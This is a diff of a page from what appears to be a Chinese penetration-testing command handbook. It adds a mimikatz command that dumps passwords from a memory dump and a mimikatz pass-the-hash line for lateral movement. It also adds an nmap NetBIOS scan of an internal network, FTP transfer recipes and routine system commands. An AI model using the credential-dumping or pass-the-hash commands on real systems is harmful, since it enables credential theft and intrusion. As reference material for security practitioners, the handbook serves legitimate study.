@@ -45,6 +45,15 @@
 							
 					<ul>
 						<li class="file">
+							<a href="/SafetyAtlas/安全学习/AI/">
+								<i class="fa fa-file"></i>
+								AI
+							</a>
+						</li>
+					</ul>
+	
+					<ul>
+						<li class="file">
 							<a href="/SafetyAtlas/安全学习/CTF/">
 								<i class="fa fa-file"></i>
 								CTF
@@ -203,6 +212,15 @@
 							<a href="/SafetyAtlas/渗透手册/导航/">
 								<i class="fa fa-file"></i>
 								导航
+							</a>
+						</li>
+					</ul>
+	
+					<ul>
+						<li class="file">
+							<a href="/SafetyAtlas/渗透手册/常见口令/">
+								<i class="fa fa-file"></i>
+								常见口令
 							</a>
 						</li>
 					</ul>
@@ -709,8 +727,19 @@
 <td></td>
 </tr>
 </tbody></table>
-<h2 id="Minikaz"><a href="#Minikaz" class="headerlink" title="Minikaz"></a>Minikaz</h2><p>获取123.dmp文件的密码</p>
+<h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><p>在pom.xml目录下封装jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Minikaz"><a href="#Minikaz" class="headerlink" title="Minikaz"></a>Minikaz</h2><h3 id="读取dmp密码"><a href="#读取dmp密码" class="headerlink" title="读取dmp密码"></a>读取dmp密码</h3><p>获取123.dmp文件的密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log &quot;sekurlsa::minidump 123.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="横向哈希传递攻击"><a href="#横向哈希传递攻击" class="headerlink" title="横向哈希传递攻击"></a>横向哈希传递攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:用户名 /domain:目标主机IP /ntlm:NTLM哈希</span><br></pre></td></tr></table></figure>
+
+
 
 <h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><table>
 <thead>
@@ -1005,6 +1034,12 @@
 <td>-sF</td>
 <td></td>
 <td>检测防火墙状态，识别端口状态</td>
+</tr>
+<tr>
+<td>Netbios检测存活IP（内网）</td>
+<td>–script nbstat.nse</td>
+<td><strong>nmap -sU –script nbstat.nse -p 137 172.20.10.0&#x2F;24 -T4</strong></td>
+<td>-T4 假设用户具有合适可靠的网络<br/>-sU为扫描UDP端口<br></td>
 </tr>
 <tr>
 <td>检测TLS版本</td>
@@ -1418,7 +1453,27 @@
 <td></td>
 </tr>
 </tbody></table>
-<h1 id="数据库命令"><a href="#数据库命令" class="headerlink" title="数据库命令"></a>数据库命令</h1><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><table>
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h3 id="Curl命令传输"><a href="#Curl命令传输" class="headerlink" title="Curl命令传输"></a>Curl命令传输</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u username:password -o 保存的文件名 ftp://ftp.example.com/remote/path/remote_file</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h3><p>创建一个文本1.txt，内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">open 目标地址 端口</span><br><span class="line">用户名</span><br><span class="line">密码</span><br><span class="line">binary</span><br><span class="line">lcd 本地保存路径</span><br><span class="line">cd 目标文件路径</span><br><span class="line">get 目标文件名</span><br><span class="line">bye</span><br></pre></td></tr></table></figure>
+
+<p>然后在DOS界面输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp -n -s:1.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h3><p>使用here文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ftp -n &lt;&lt;EOF</span><br><span class="line">open ftp.example.com</span><br><span class="line">user username password</span><br><span class="line">binary</span><br><span class="line">lcd /local/path</span><br><span class="line">cd /remote/path</span><br><span class="line">get remote_file local_file</span><br><span class="line">bye</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+
+
+<p>单行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;user username password\nbinary\nlcd /local/path\ncd /remote/path\nget remote_file&quot; | ftp -n ftp.example.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h2><h2 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h2><h1 id="数据库命令"><a href="#数据库命令" class="headerlink" title="数据库命令"></a>数据库命令</h1><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><table>
 <thead>
 <tr>
 <th>作用</th>
@@ -2140,6 +2195,11 @@
 <td></td>
 </tr>
 <tr>
+<td>删除文件夹</td>
+<td>rd 文件夹</td>
+<td>可结合&#x2F;s删除子目录，和 &#x2F;q静默模式无需选择</td>
+</tr>
+<tr>
 <td>文件合并</td>
 <td>copy 文件1&#x2F;b + 文件2&#x2F;a 文件3</td>
 <td>&#x2F;b表示文件1为二进制文件<br>&#x2F;a表示文件2为ascii码文件</td>
@@ -2227,11 +2287,6 @@
 <tr>
 <td>查看文件hash哈希值</td>
 <td>certutil -hashfile 文件名</td>
-<td></td>
-</tr>
-<tr>
-<td>删除文件夹</td>
-<td>rd 文件夹</td>
 <td></td>
 </tr>
 <tr>
@@ -3043,13 +3098,18 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>查看系统内核版本</td>
-<td>uname -srm</td>
+<td>查看内核版本</td>
+<td>uname -srm<br>uname -a</td>
 <td></td>
 </tr>
 <tr>
 <td>查看内核版本</td>
 <td>hostnamectl</td>
+<td></td>
+</tr>
+<tr>
+<td>查看内核版本</td>
+<td>lsb_release -a</td>
 <td></td>
 </tr>
 </tbody></table>
@@ -3130,8 +3190,8 @@
 <td></td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td>查询开放端口</td>
+<td>netstat -nlt</td>
 <td></td>
 </tr>
 <tr>
